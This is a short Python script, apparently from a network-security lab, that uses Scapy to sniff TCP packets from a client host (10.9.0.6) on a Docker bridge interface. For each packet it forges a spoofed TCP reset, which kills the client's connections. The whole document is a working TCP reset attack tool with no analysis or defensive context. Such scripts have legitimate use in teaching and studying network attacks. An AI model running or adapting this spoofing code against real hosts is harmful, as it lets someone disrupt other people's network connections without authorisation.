#!/bin/python3
from scapy.all import *
import sys

strClientIP = '10.9.0.6'

def spoof_tcp(pkt):

    print(pkt[IP].src)
    lyrIP = IP(dst=strClientIP, src = pkt[IP].dst)
    lyrTCP = TCP(flags="R", seq=pkt[TCP].ack, dport=pkt[TCP].sport, sport=pkt[TCP].dport)
    
    # Build the spoofed packet
    pktSpoofedPacket = lyrIP / lyrTCP
    
    # Send the spoofed packet
    send(pktSpoofedPacket, verbose=0)

# NOTE: Without the iface argument, running inside a docker container leads to scapy not
# sniffing properly. This argument MUST be changed to match the correct interface when
# running on a different host.
pkt = sniff(filter='tcp and src host {}'.format(strClientIP),
            iface='br-e5b89a0c237d',
            prn=spoof_tcp)
